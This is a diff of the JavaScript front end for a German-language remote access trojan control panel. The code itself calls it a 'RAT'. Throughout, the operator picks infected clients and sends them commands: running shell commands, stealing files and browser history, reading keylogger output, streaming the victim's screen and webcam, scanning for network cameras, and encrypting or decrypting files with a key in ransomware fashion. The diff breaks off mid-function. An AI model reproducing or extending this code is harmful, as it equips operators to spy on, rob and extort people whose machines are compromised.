-      document.querySelectorAll("#client-list li").forEach((el) => el.classList.remove("selected"));
-      const li = clientList.querySelector(`li[data-client-id='${selectedClientId}']`);
-      if (li) li.classList.add("selected");
-      log(`Client ${clientObj?.hostname || id} ausgewählt.`, "cmd");
-      if (screenCanvas && screenCanvas.getContext) {
-        screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
-      }
-      if (screenStatus) screenStatus.textContent = '';
-    }
-
-    // --- LOGGING ---
-    function log(message, type = "info") {
-      const entry = document.createElement("div");
-      entry.className = `log-entry log-${type}`;
-      entry.innerHTML = highlightSyntax(`[${new Date().toLocaleTimeString()}] ${message}`);
-      output.appendChild(entry);
-      output.scrollTop = output.scrollHeight;
-      debugLog(message, type);
-    }
-    function highlightSyntax(text) {
-      return text
-        .replace(/(error|fehler)/gi, '<span style="color:#f44336;font-weight:bold">$1</span>')
-        .replace(/(\$ |PS |C:\\\\|C:\/)/g, '<span style="color:#8ecae6;font-weight:bold">$1</span>');
-    }
-
-    // --- COMMAND HISTORY ---
-    let cmdHistory = JSON.parse(localStorage.getItem("cmdHistory") || "[]");
-    let cmdHistoryIdx = cmdHistory.length;
-    commandInput.addEventListener("keydown", (e) => {
-      if (e.key === "ArrowUp") {
-        if (cmdHistory.length && cmdHistoryIdx > 0) {
-          cmdHistoryIdx--;
-          commandInput.value = cmdHistory[cmdHistoryIdx];
-          e.preventDefault();
-        }
-      } else if (e.key === "ArrowDown") {
-        if (cmdHistory.length && cmdHistoryIdx < cmdHistory.length - 1) {
-          cmdHistoryIdx++;
-          commandInput.value = cmdHistory[cmdHistoryIdx];
-          e.preventDefault();
-        } else if (cmdHistoryIdx === cmdHistory.length - 1) {
-          commandInput.value = "";
-          cmdHistoryIdx = cmdHistory.length;
-        }
-      } else if (e.key === "Tab") {
-        // Tab-Vervollständigung für Slash-Befehle
-        const val = commandInput.value;
-        if (val.startsWith("/")) {
-          const filtered = COMMANDS.filter(c =>
-            c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
-          );
-          if (filtered.length === 1) {
-            commandInput.value = filtered[0].cmd + " ";
-            e.preventDefault();
-          } else if (filtered.length > 1) {
-            // Vervollständige bis zum längsten gemeinsamen Präfix
-            let prefix = filtered[0].cmd;
-            for (let i = 1; i < filtered.length; i++) {
-              let j = 0;
-              while (j < prefix.length && prefix[j] === filtered[i].cmd[j]) j++;
-              prefix = prefix.slice(0, j);
-            }
-            if (prefix.length > val.length) {
-              commandInput.value = prefix;
-              e.preventDefault();
-            }
-          }
-        }
-      }
-    });
-
-    // --- Upload-Dialog: /upload [Zielpfad] ---
-    function showUploadInput(show) {
-      uploadInput.style.display = show ? "inline-block" : "none";
-    }
-    commandInput.addEventListener("input", function () {
-      const val = commandInput.value.trim();
-      showUploadInput(val.startsWith("/upload"));
-    });
-
-    // Initial verstecken
-    showUploadInput(false);
-
-    // --- Chunked Upload für große Dateien ---
-    const CHUNK_SIZE = 512 * 1024; // 512 KB pro Chunk
-
-    uploadInput.addEventListener("change", function () {
-      const file = uploadInput.files && uploadInput.files[0];
-      if (!file) return;
-      const lastUploadPath = window._lastUploadTargetPath || ".";
-      if (file.size <= CHUNK_SIZE) {
-        // Klein: wie bisher
-        const reader = new FileReader();
-        reader.onload = function (e) {
-          const dataUrl = e.target.result;
-          let base64 = "";
-          if (typeof dataUrl === "string" && dataUrl.startsWith("data:")) {
-            base64 = dataUrl.split(",")[1];
-          }
-          const payload = {
-            action: "upload",
-            filename: lastUploadPath,
-            data: base64,
-            is_chunked: false,
-          };
-          sendCommand(payload);
-        };
-        reader.readAsDataURL(file);
-      } else {
-        // Groß: Chunked Upload
-        chunkedUploadFile(file, lastUploadPath);
-      }
-      uploadInput.value = "";
-    });
-
-    function chunkedUploadFile(file, targetPath) {
-      const totalChunks = Math.ceil(file.size / CHUNK_SIZE);
-      let currentChunk = 0;
-      let fileId = Date.now() + "_" + Math.floor(Math.random() * 1e6);
-      function sendNextChunk() {
-        const start = currentChunk * CHUNK_SIZE;
-        const end = Math.min(start + CHUNK_SIZE, file.size);
-        const blob = file.slice(start, end);
-        const reader = new FileReader();
-        reader.onload = function (e) {
-          let base64 = "";
-          const dataUrl = e.target.result;
-          if (typeof dataUrl === "string" && dataUrl.startsWith("data:")) {
-            base64 = dataUrl.split(",")[1];
-          }
-          const payload = {
-            action: "upload_chunk",
-            filename: targetPath,
-            file_id: fileId,
-            chunk_index: currentChunk,
-            total_chunks: totalChunks,
-            data: base64,
-            is_chunked: true,
-            original_filename: file.name,
-            filesize: file.size,
-          };
-          ws.send(JSON.stringify(payload));
-          log(`Chunk ${currentChunk + 1}/${totalChunks} gesendet...`, "info");
-          currentChunk++;
-          if (currentChunk < totalChunks) {
-            setTimeout(sendNextChunk, 50); // kleine Pause, um Überlast zu vermeiden
-          } else {
-            log("Alle Chunks gesendet. Warte auf Bestätigung...", "info");
-          }
-        };
-        reader.readAsDataURL(blob);
-      }
-      sendNextChunk();
-    }
-
-    // --- BEFEHL SENDEN ---
-    function sendCommand(customPayload = null) {
-      if (!selectedClientId) {
-        log("Fehler: Kein Client ausgewählt.", "error");
-        debugLog("Kein Client ausgewählt beim Senden", "warn");
-        return;
-      }
-      let payload;
-      const commandText = customPayload ? "" : commandInput.value.trim();
-      if (!customPayload && !commandText) return;
-      // --- History speichern ---
-      if (!customPayload && commandText) {
-        if (cmdHistory[cmdHistory.length - 1] !== commandText) {
-          cmdHistory.push(commandText);
-          if (cmdHistory.length > 100) cmdHistory.shift();
-          localStorage.setItem("cmdHistory", JSON.stringify(cmdHistory));
-        }
-        cmdHistoryIdx = cmdHistory.length;
-      }
-      if (customPayload) {
-        payload = { target_id: String(selectedClientId), ...customPayload };
-      } else {
-        // /upload [zielpfad]
-        if (commandText.startsWith("/upload")) {
-          const parts = commandText.split(" ");
-          const targetPath = parts.slice(1).join(" ").trim() || ".";
-          window._lastUploadTargetPath = targetPath;
-          uploadInput.click();
-          // Kein Senden an den Server, bis Datei gewählt wurde!
-          commandInput.value = "";
-          hideSuggest();
-          return;
-        }
-        // /screenstream_start und /screenstream_stop UI-Handling
-        if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
-        if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
-        if (commandText.startsWith("/webcam_start")) handleWebcamCommand("/webcam_start");
-        if (commandText.startsWith("/webcam_stop")) handleWebcamCommand("/webcam_stop");
-        let slashPayload = parseSlashCommand(commandText);
-        if (slashPayload && slashPayload.action) {
-          payload = { target_id: String(selectedClientId), ...slashPayload };
-        } else {
-          const parts = commandText.split(" ");
-          const action = parts[0].toLowerCase();
-          const argument = parts.slice(1).join(" ");
-          payload = {
-            target_id: String(selectedClientId),
-            action: action,
-          };
-          if (action === "screenstream_start") handleLiveScreenCommand("/screenstream_start");
-          if (action === "screenstream_stop") handleLiveScreenCommand("/screenstream_stop");
-          switch (action) {
-            case "exec":
-              payload.command = argument;
-              break;
-            case "download":
-              payload.path = argument;
-              break;
-            case "history":
-              payload.limit = parseInt(argument) || 20;
-              break;
-            case "keylogger":
-              payload.count = parseInt(argument) || 50;
-              break;
-            case "ls":
-              payload.path = argument || ".";
-              break;
-            case "cd":
-              payload.path = argument || ".";
-              break;
-            case "encrypt":
-              payload.path = argument || ".";
-              break;
-            case "decrypt": {
-              const [path, key_hex] = argument.split(" ");
-              payload.path = path || ".";
-              payload.key_hex = key_hex || "";
-              break;
-            }
-            case "screenshot":
-            case "systeminfo":
-            case "shutdown":
-            case "restart":
-            case "screenstream_start":
-            case "screenstream_stop":
-            case "help":
-              break;
-            default:
-              // Unbekannter Befehl: trotzdem senden
-              payload.argument = argument;
-          }
-        }
-      }
-      ws.send(JSON.stringify(payload));
-      log(
-        `Befehl gesendet: ${payload.action || "(unbekannt)"}${
-          payload.command ? " " + payload.command : payload.path ? " " + payload.path : payload.argument ? " " + payload.argument : ""
-        }`,
-        "cmd"
-      );
-      debugLog("Befehl gesendet: " + JSON.stringify(payload), "info");
-      if (!customPayload) {
-        commandInput.value = "";
-        hideSuggest();
-      }
-    }
-
-    // --- Slash-Befehle für Suggestion ---
-    const COMMANDS = [
-      { cmd: "/help", desc: "Zeigt die Hilfe an" },
-      { cmd: "/exec", desc: "Führe einen Shell-Befehl aus" },
-      { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
-      { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
-      { cmd: "/upload", desc: "Datei zum Client hochladen" },
-      { cmd: "/history", desc: "Browserverlauf anzeigen" },
-      { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
-      { cmd: "/ls", desc: "Verzeichnis auflisten" },
-      { cmd: "/cd", desc: "Wechsle das Verzeichnis" },
-      { cmd: "/encrypt", desc: "Datei/Verzeichnis verschlüsseln" },
-      { cmd: "/decrypt", desc: "Datei/Verzeichnis entschlüsseln" },
-      { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
-      { cmd: "/shutdown", desc: "Client herunterfahren" },
-      { cmd: "/restart", desc: "Client neustarten" },
-      { cmd: "/screenstream_start", desc: "Live-Screen starten" },
-      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" },
-      { cmd: "/scan_cameras", desc: "Suche nach Netzwerk-Kameras im LAN" },
-      { cmd: "/webcam_start", desc: "Live-Webcam-Stream starten" },
-      { cmd: "/webcam_stop", desc: "Live-Webcam-Stream stoppen" }
+    // Command suggestions
+    const commands = [
+      { cmd: '/help', desc: 'Zeigt verfügbare Befehle an' },
+      { cmd: '/exec', desc: 'Führt einen Shell-Befehl aus' },
+      { cmd: '/screenshot', desc: 'Macht einen Screenshot' },
+      { cmd: '/download', desc: 'Lädt eine Datei herunter' },
+      { cmd: '/upload', desc: 'Lädt eine Datei hoch' },
+      { cmd: '/ls', desc: 'Listet Verzeichnisinhalt auf' },
+      { cmd: '/cd', desc: 'Wechselt das Verzeichnis' },
+      { cmd: '/systeminfo', desc: 'Zeigt Systeminformationen' },
+      { cmd: '/history', desc: 'Zeigt Browser-Verlauf' },
+      { cmd: '/keylogger', desc: 'Zeigt Keylogger-Daten' },
+      { cmd: '/screenstream_start', desc: 'Startet Screen-Streaming' },
+      { cmd: '/screenstream_stop', desc: 'Stoppt Screen-Streaming' },
+      { cmd: '/webcam_start', desc: 'Startet Webcam-Stream' },
+      { cmd: '/webcam_stop', desc: 'Stoppt Webcam-Stream' },
+      { cmd: '/encrypt', desc: 'Verschlüsselt Dateien/Ordner' },
+      { cmd: '/decrypt', desc: 'Entschlüsselt Dateien/Ordner' },
+      { cmd: '/scan_cameras', desc: 'Scannt nach Netzwerk-Kameras' },
+      { cmd: '/shutdown', desc: 'Fährt das System herunter' },
+      { cmd: '/restart', desc: 'Startet das System neu' }
     ];
 
-    let suggestIdx = 0;
-    function showSuggest() {
-      const val = commandInput.value;
-      if (!val.startsWith("/")) {
-        commandSuggest.style.display = "none";
-        return;
-      }
-      const query = val.slice(1).toLowerCase();
-      const filtered = COMMANDS.filter(cmd => cmd.cmd.slice(1).startsWith(query));
-      commandSuggest.innerHTML = "";
-      if (filtered.length === 0) {
-        commandSuggest.style.display = "none";
-        return;
-      }
-      filtered.forEach((cmd, idx) => {
-        const li = document.createElement("div");
-        li.className = "suggest-item" + (idx === suggestIdx ? " selected" : "");
-        li.textContent = cmd.cmd;
-        const desc = document.createElement("span");
-        desc.className = "suggest-desc";
-        desc.textContent = cmd.desc;
-        li.appendChild(desc);
-        li.onmouseenter = () => {
-          suggestIdx = idx;
-          updateSuggestHighlight();
-        };
-        li.onmousedown = (e) => {
-          e.preventDefault();
-          commandInput.value = cmd.cmd + " ";
-          commandInput.focus();
-          hideSuggest();
-        };
-        commandSuggest.appendChild(li);
-      });
-      commandSuggest.style.display = "block";
-      updateSuggestHighlight();
-    }
-    function hideSuggest() {
-      commandSuggest.style.display = "none";
-    }
-    function updateSuggestHighlight() {
-      Array.from(commandSuggest.children).forEach((el, idx) => {
-        el.classList.toggle("selected", idx === suggestIdx);
-      });
-    }
-    commandInput.addEventListener("input", showSuggest);
-    commandInput.addEventListener("focus", showSuggest);
-    commandInput.addEventListener("blur", () => setTimeout(hideSuggest, 120));
-    commandInput.addEventListener("keydown", (e) => {
-      const val = commandInput.value;
-      const filtered = COMMANDS.filter(cmd => cmd.cmd.slice(1).startsWith(val.slice(1).toLowerCase()));
-      if (commandSuggest.style.display === "block" && filtered.length > 0) {
-        if (e.key === "ArrowDown") {
-          suggestIdx = Math.min(suggestIdx + 1, filtered.length - 1);
-          updateSuggestHighlight();
-          e.preventDefault();
-        } else if (e.key === "ArrowUp") {
-          suggestIdx = Math.max(suggestIdx - 1, 0);
-          updateSuggestHighlight();
-          e.preventDefault();
-        } else if (e.key === "Tab" || e.key === "Enter") {
-          commandInput.value = filtered[suggestIdx].cmd + " ";
-          commandInput.focus();
-          hideSuggest();
-          e.preventDefault();
-        } else if (e.key === "Escape") {
-          hideSuggest();
-        }
-      }
-    });
+    // DOM Elements
+    const loginOverlay = document.getElementById('login-overlay');
+    const mainApp = document.getElementById('main-app');
+    const loginForm = document.getElementById('login-form');
+    const loginError = document.getElementById('login-error');
+    const connectionStatus = document.getElementById('connection-status');
+    const clientList = document.getElementById('client-list');
+    const clientCount = document.getElementById('client-count');
+    const selectedCount = document.getElementById('selected-count');
+    const commandInput = document.getElementById('command-input');
+    const commandSuggestions = document.getElementById('command-suggestions');
+    const sendCommand = document.getElementById('send-command');
+    const outputArea = document.getElementById('output-area');
+    const fileUpload = document.getElementById('file-upload');
+    const uploadBtn = document.getElementById('upload-btn');
+    const screenshotContainer = document.getElementById('screenshot-container');
+    const screenshotImg = document.getElementById('screenshot-img');
+    const screenStreamContainer = document.getElementById('screen-stream-container');
+    const screenCanvas = document.getElementById('screen-canvas');
+    const screenStatus = document.getElementById('screen-status');
+    const webcamContainer = document.getElementById('webcam-container');
+    const webcamCanvas = document.getElementById('webcam-canvas');
+    const webcamStatus = document.getElementById('webcam-status');
+    const mediaPlaceholder = document.getElementById('media-placeholder');
 
-    // --- parseSlashCommand: robust für alle /-Befehle ---
-    function parseSlashCommand(cmdText) {
-      if (typeof cmdText !== "string" || !cmdText.startsWith("/")) return null;
-      const [slash, ...args] = cmdText.trim().split(" ");
-      const action = slash.replace("/", "");
-      // Spezialfall: encrypt/decrypt mit Pfad und Key
-      if (action === "encrypt") {
-        return { action, path: args.join(" ") || "." };
-      }
-      if (action === "decrypt") {
-        if (args.length < 2) return { action, path: args.join(" ") || ".", key_hex: "" };
-        const key_hex = args[args.length - 1];
-        const path = args.slice(0, -1).join(" ") || ".";
-        return { action, path, key_hex };
-      }
-      const argument = args.join(" ");
-      switch (action) {
-        case "exec":
-          return { action, command: argument };
-        case "download":
-          return { action, path: argument };
-        case "upload":
-          return { action };
-        case "history":
-          return { action, limit: parseInt(argument) || 20 };
-        case "keylogger":
-          return { action, count: parseInt(argument) || 50 };
-        case "ls":
-          return { action, path: argument || "." };
-        case "cd":
-          return { action, path: argument || "." };
-        case "screenshot":
-        case "systeminfo":
-        case "shutdown":
-        case "restart":
-        case "screenstream_start":
-        case "screenstream_stop":
-        case "scan_cameras":
-        case "webcam_start":
-        case "webcam_stop":
-        case "help":
-          return { action };
-        default:
-          return { action, argument };
+    // Utility Functions
+    function showNotification(message, type = 'info', duration = 3000) {
+      const notification = document.createElement('div');
+      const colors = {
+        success: 'bg-green-600',
+        error: 'bg-red-600',
+        warning: 'bg-yellow-600',
+        info: 'bg-blue-600'
+      };
+      
+      notification.className = `notification ${colors[type]} text-white px-4 py-3 rounded-lg shadow-lg max-w-sm`;
+      notification.innerHTML = `
+        <div class="flex items-center justify-between">
+          <span>${message}</span>
+          <button onclick="this.parentElement.parentElement.remove()" class="ml-3 text-white hover:text-gray-200">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+      `;
+      
+      document.getElementById('notifications').appendChild(notification);
+      
+      if (duration > 0) {
+        setTimeout(() => notification.remove(), duration);
       }
     }
 
-    // --- Live-Screen-Kommandos: UI-Statusanzeige und Bereich ein-/ausblenden ---
-    function handleLiveScreenCommand(cmd) {
-      if (!liveScreenArea) return;
-      if (cmd === "/screenstream_start" || cmd === "screenstream_start") {
-        liveScreenArea.style.display = "";
-        if (screenStatus) screenStatus.textContent = "Live-Bild wird gestartet...";
-      } else if (cmd === "/screenstream_stop" || cmd === "screenstream_stop") {
-        liveScreenArea.style.display = "none";
-        if (screenCanvas && screenCanvas.getContext) {
-          screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
-        }
-        if (screenStatus) screenStatus.textContent = "";
+    function updateConnectionStatus(status, message) {
+      const statusElement = connectionStatus;
+      statusElement.className = 'px-3 py-2 rounded-full text-sm font-medium';
+      
+      switch (status) {
+        case 'connected':
+          statusElement.className += ' bg-green-500 text-green-900';
+          statusElement.innerHTML = '<i class="fas fa-check-circle mr-2"></i>Verbunden';
+          break;
+        case 'connecting':
+          statusElement.className += ' bg-yellow-500 text-yellow-900';
+          statusElement.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verbinde...';
+          break;
+        case 'disconnected':
+          statusElement.className += ' bg-red-500 text-red-900';
+          statusElement.innerHTML = '<i class="fas fa-exclamation-triangle mr-2"></i>Getrennt';
+          break;
+        case 'error':
+          statusElement.className += ' bg-red-600 text-red-100';
+          statusElement.innerHTML = '<i class="fas fa-times-circle mr-2"></i>Fehler';
+          break;
       }
     }
 
-    // --- Webcam Live-Stream UI ---
-    let webcamArea = null;
-    let webcamCanvas = null;
-    let webcamStatus = null;
-    let wsMessageHandler = null; // Speichert den Standardhandler
-
-    function ensureWebcamArea() {
-      if (!webcamArea) {
-        webcamArea = document.createElement("div");
-        webcamArea.id = "webcam-area";
-        webcamArea.style.display = "none";
-        webcamArea.innerHTML = `
-          <canvas id="webcam-canvas" tabindex="0"></canvas>
-          <div id="webcam-status"></div>
-        `;
-        document.getElementById("main-panel").appendChild(webcamArea);
-        webcamCanvas = webcamArea.querySelector("#webcam-canvas");
-        webcamStatus = webcamArea.querySelector("#webcam-status");
-      }
-    }
-    function handleWebcamCommand(cmd) {
-      ensureWebcamArea();
-      if (cmd === "/webcam_start" || cmd === "webcam_start") {
-        webcamArea.style.display = "";
-        if (webcamStatus) webcamStatus.textContent = "Webcam-Stream wird gestartet...";
-      } else if (cmd === "/webcam_stop" || cmd === "webcam_stop") {
-        webcamArea.style.display = "none";
-        if (webcamCanvas && webcamCanvas.getContext) {
-          webcamCanvas.getContext('2d').clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
-        }
-        if (webcamStatus) webcamStatus.textContent = "";
-      }
+    function logOutput(message, type = 'info') {
+      const timestamp = new Date().toLocaleTimeString();
+      const logEntry = document.createElement('div');
+      logEntry.className = 'mb-2 p-2 rounded';
+      
+      const colors = {
+        info: 'text-gray-300',
+        success: 'text-green-400',
+        error: 'text-red-400',
+        warning: 'text-yellow-400',
+        command: 'text-blue-400'
+      };
+      
+      logEntry.className += ` ${colors[type]}`;
+      logEntry.innerHTML = `<span class="text-gray-500 text-xs">[${timestamp}]</span> ${message}`;
+      
+      outputArea.appendChild(logEntry);
+      outputArea.scrollTop = outputArea.scrollHeight;
+      
+      // Remove placeholder
+      const placeholder = outputArea.querySelector('.text-center.py-8');
+      if (placeholder) placeholder.remove();
     }
 
-    // --- WebSocket Initialisierung ---
-    window.initRatApp = function(token) {
-      // WebSocket mit Token als Query-Parameter
-      const ws = new WebSocket(
-        (location.protocol === "https:" ? "wss://" : "ws://") +
-        location.host +
-        "/ws?token=" + encodeURIComponent(token || window._rat_token || "")
-      );
-      window.ws = ws;
-
-      // --- Webcam-Frame Empfang ---
-      function webcamFrameHandler(event) {
-        // 1. Meta-Frame (action: webcam_frame)
-        let meta;
-        try {
-          meta = JSON.parse(event.data);
-        } catch {
-          return;
-        }
-        if (meta.action === "webcam_frame") {
-          ensureWebcamArea();
-          if (webcamArea) webcamArea.style.display = "";
-          // 2. Nächstes Frame ist das Bild (base64)
-          ws.onmessage = function (event2) {
-            // Fix: Prüfe, ob das Frame base64 ist, sonst als Binärdaten behandeln
-            let b64 = null;
-            // Server sendet als {action: "webcam_frame", img_base64: ...}
-            try {
-              const d = JSON.parse(event2.data);
-              if (d.action === "webcam_frame" && d.img_base64) {
-                b64 = d.img_base64;
-              }
-            } catch {
-              if (typeof event2.data === "string" && event2.data.length > 100) {
-                b64 = event2.data;
-              }
-            }
-            if (b64) {
-              const img = new window.Image();
-              img.onload = function () {
-                webcamCanvas.width = img.width;
-                webcamCanvas.height = img.height;
-                const ctx = webcamCanvas.getContext("2d");
-                ctx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
-                ctx.drawImage(img, 0, 0, img.width, img.height);
-              };
-              img.src = "data:image/jpeg;base64," + b64;
-              if (webcamStatus) webcamStatus.textContent = "Live-Webcam";
-              ws.onmessage = wsMessageHandler;
-            }
-          };
+    // Authentication
+    async function login(username, password) {
+      try {
+        const response = await fetch('/login', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ username, password })
+        });
+        
+        const data = await response.json();
+        
+        if (response.ok && data.token) {
+          localStorage.setItem('rat_token', data.token);
+          isAuthenticated = true;
+          loginOverlay.classList.add('hidden');
+          mainApp.classList.remove('hidden');
+          connectWebSocket();
+          showNotification('Erfolgreich angemeldet!', 'success');
+          return true;
         } else {
-          wsMessageHandler(event);
+          throw new Error(data.error || 'Login fehlgeschlagen');
         }
+      } catch (error) {
+        loginError.textContent = error.message;
+        loginError.classList.remove('hidden');
+        showNotification(error.message, 'error');
+        return false;
       }
+    }
 
-      ws.onopen = () => {
-        log("WebSocket verbunden.", "info");
-        debugLog("WebSocket verbunden", "info");
+    // WebSocket Connection
+    function connectWebSocket() {
+      const token = localStorage.getItem('rat_token');
+      if (!token) {
+        showLogin();
+        return;
+      }
+      
+      updateConnectionStatus('connecting');
+      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      const wsUrl = `${protocol}//${location.host}/ws?token=${encodeURIComponent(token)}`;
+      
+      ws = new WebSocket(wsUrl);
+      
+      ws.onopen = function() {
+        updateConnectionStatus('connected');
+        showNotification('WebSocket Verbindung hergestellt', 'success');
+        reconnectAttempts = 0;
+        requestClientList();
       };
-
-      ws.onclose = () => {
-        log("WebSocket getrennt.", "error");
-        debugLog("WebSocket getrennt", "warn");
-      };
-
-      ws.onerror = (e) => {
-        log("WebSocket Fehler.", "error");
-        debugLog("WebSocket Fehler: " + e, "error");
-      };
-
-      wsMessageHandler = function(event) {
-        let data;
+      
+      ws.onmessage = function(event) {
         try {
-          data = JSON.parse(event.data);
-        } catch (e) {
-          debugLog("Fehler beim Parsen der Nachricht: " + e, "error");
-          return;
-        }
-        if (data.type === "client_list") {
-          renderClientList(data.clients || []);
-        } else if (data.type === "client_connected" || data.type === "client_disconnected") {
-          ws.send(JSON.stringify({ action: "get_clients" }));
-        } else if (data.type === "command_output") {
-          log(data.output || "Kein Output.", "info");
-        } else if (data.type === "file_download") {
-          const blob = b64toBlob(data.data, "application/octet-stream");
-          const a = document.createElement("a");
-          a.href = URL.createObjectURL(blob);
-          a.download = data.filename || "download.bin";
-          a.click();
-          log("Datei-Download gestartet: " + (data.filename || ""), "info");
-        } else if (data.type === "screenshot") {
-          const img = document.createElement("img");
-          img.src = "data:image/png;base64," + data.data;
-          img.style.maxWidth = "100%";
-          output.appendChild(img);
-          log("Screenshot empfangen.", "info");
-        } else if (data.action === "screen_frame") {
-          if (liveScreenArea) liveScreenArea.style.display = "";
-          if (screenCanvas) {
-            const ctx = screenCanvas.getContext("2d");
-            const img = new window.Image();
-            img.onload = function () {
-              screenCanvas.width = data.width;
-              screenCanvas.height = data.height;
-              ctx.clearRect(0, 0, screenCanvas.width, screenCanvas.height);
-              ctx.drawImage(img, 0, 0, data.width, data.height);
-            };
-            img.src = "data:image/jpeg;base64," + data.img_bytes;
+          let data;
+          
+          // Handle both text and binary messages
+          if (typeof event.data === 'string') {
+            data = JSON.parse(event.data);
+          } else {
+            // Binary data (for images/streams)
+            handleBinaryData(event.data);
+            return;
           }
-          if (screenStatus) screenStatus.textContent = "Live-Bild";
-        } else if (data.action === "webcam_frame") {
-          // Spezialbehandlung: Webcam-Stream
-          webcamFrameHandler(event);
-          return;
-        } else if (data.type === "encryption_key") {
-          log("Verschlüsselungs-Schlüssel empfangen: " + data.key_hex, "info");
-        } else if (data.type === "error") {
-          log(data.message || data.error || "Fehler", "error");
-        } else if (data.type === "debug") {
-          debugLog(data.msg, data.level || "info");
-        } else if (data.type === "client_log") {
-          log("[Client] " + (data.msg || ""), data.level || "info");
-          debugLog("[Client] " + (data.msg || ""), data.level || "info");
-        } else if (data.type === "webcam_image") {
-          const img = document.createElement("img");
-          img.src = "data:image/png;base64," + data.data;
-          img.style.maxWidth = "100%";
-          output.appendChild(img);
-          log("Webcam-Bild empfangen.", "info");
+          
+          handleWebSocketMessage(data);
+        } catch (error) {
+          console.error('Error parsing WebSocket message:', error);
+          logOutput(`Fehler beim Verarbeiten der Nachricht: ${error.message}`, 'error');
         }
       };
+      
+      ws.onclose = function(event) {
+        updateConnectionStatus('disconnected');
+        
+        if (event.code === 4401) {
+          // Unauthorized - token expired
+          localStorage.removeItem('rat_token');
+          showLogin();
+          showNotification('Sitzung abgelaufen. Bitte erneut anmelden.', 'warning');
+        } else if (reconnectAttempts < maxReconnectAttempts) {
+          reconnectAttempts++;
+          showNotification(`Verbindung verloren. Neuverbindung in 3 Sekunden... (${reconnectAttempts}/${maxReconnectAttempts})`, 'warning');
+          setTimeout(connectWebSocket, 3000);
+        } else {
+          showNotification('Maximale Anzahl von Neuverbindungsversuchen erreicht', 'error');
+        }
+      };
+      
+      ws.onerror = function(error) {
+        console.error('WebSocket Error:', error);
+        updateConnectionStatus('error');
+        showNotification('WebSocket Verbindungsfehler', 'error');
+      };
+    }
 
-      // --- Senden-Button ---
-      sendButton.onclick = () => sendCommand();
-      commandInput.addEventListener("keydown", (e) => {
-        if (e.key === "Enter" && !e.shiftKey) {
-          sendCommand();
+    function handleWebSocketMessage(data) {
+      switch (data.type) {
+        case 'client_list':
+          updateClientList(data.clients || []);
+          break;
+          
+        case 'client_connected':
+          showNotification(`Neuer Client verbunden: ${data.client.hostname}`, 'success');
+          requestClientList(); // Auto-refresh client list
+          break;
+          
+        case 'client_disconnected':
+          showNotification(`Client getrennt: ${data.client_id}`, 'warning');
+          selectedClients.delete(data.client_id);
+          updateSelectedCount();
+          requestClientList(); // Auto-refresh client list
+          break;
+          
+        case 'command_output':
+          logOutput(`<pre>${data.output}</pre>`, 'info');
+          break;
+          
+        case 'screenshot':
+          displayScreenshot(data.data);
+          break;
+          
+        case 'screen_frame':
+          displayScreenFrame(data);
+          break;
+          
+        case 'webcam_frame':
+          displayWebcamFrame(data);
+          break;
+          
+        case 'file_download':
+          downloadFile(data.filename, data.data);
+          break;
+          
+        case 'error':
+          logOutput(`Fehler: ${data.message}`, 'error');
+          showNotification(data.message, 'error');
+          break;
+          
+        case 'debug':
+          if (data.level === 'error') {
+            logOutput(`Debug: ${data.msg}`, 'error');
+          } else {
+            logOutput(`Debug: ${data.msg}`, 'info');
+          }
+          break;
+          
+        case 'pong':
+          // Handle ping response
+          break;
+          
+        default:
+          console.log('Unhandled message type:', data.type, data);
+      }
+    }
+
+    function handleBinaryData(data) {
+      // Handle binary data for webcam frames or other binary content
+      const canvas = webcamCanvas;
+      const ctx = canvas.getContext('2d');
+      
+      // Convert binary data to image and display
+      const blob = new Blob([data], { type: 'image/jpeg' });
+      const url = URL.createObjectURL(blob);
+      const img = new Image();
+      
+      img.onload = function() {
+        canvas.width = img.width;
+        canvas.height = img.height;
+        ctx.drawImage(img, 0, 0);
+        URL.revokeObjectURL(url);
+        
+        // Show webcam container
+        webcamContainer.classList.remove('hidden');
+        mediaPlaceholder.classList.add('hidden');
+      };
+      
+      img.src = url;
+    }
+
+    // Client Management
+    function updateClientList(clients) {
+      clientList.innerHTML = '';
+      clientCount.textContent = clients.length;
+      
+      if (clients.length === 0) {
+        clientList.innerHTML = `
+          <div class="text-center text-gray-400 py-8">
+            <i class="fas fa-satellite-dish text-3xl mb-3"></i>
+            <p>Keine Clients verbunden</p>
+            <p class="text-sm">Warte auf Verbindungen...</p>
+          </div>
+        `;
+        return;
+      }
+      
+      clients.forEach(client => {
+        const clientElement = createClientElement(client);
+        clientList.appendChild(clientElement);
+      });
+      
+      updateSelectedCount();
+    }
+
+    function createClientElement(client) {
+      const div = document.createElement('div');
+      div.className = 'client-card glass-effect p-4 rounded-lg cursor-pointer transition-all duration-300';
+      div.dataset.clientId = client.id;
+      
+      const osIcon = getOSIcon(client.os);
+      const isSelected = selectedClients.has(client.id);
+      
+      if (isSelected) {
+        div.classList.add('selected');
+      }
+      
+      div.innerHTML = `
+        <div class="flex items-center justify-between mb-2">
+          <div class="flex items-center">
+            <div class="status-dot w-3 h-3 bg-green-400 rounded-full mr-3"></div>
+            <i class="${osIcon} text-lg mr-2"></i>
+            <span class="font-medium text-white">${client.hostname}</span>
+          </div>
+          <div class="flex items-center">
+            ${isSelected ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
+          </div>
+        </div>
+        <div class="text-sm text-gray-300">
+          <div class="flex justify-between mb-1">
+            <span>IP:</span>
+            <span>${client.ip || (client.address ? client.address[0] : 'Unknown')}</span>
+          </div>
+          <div class="flex justify-between">
+            <span>OS:</span>
+            <span class="text-xs">${client.os || 'Unknown'}</span>
+          </div>
+        </div>
+      `;
+      
+      div.addEventListener('click', (e) => {
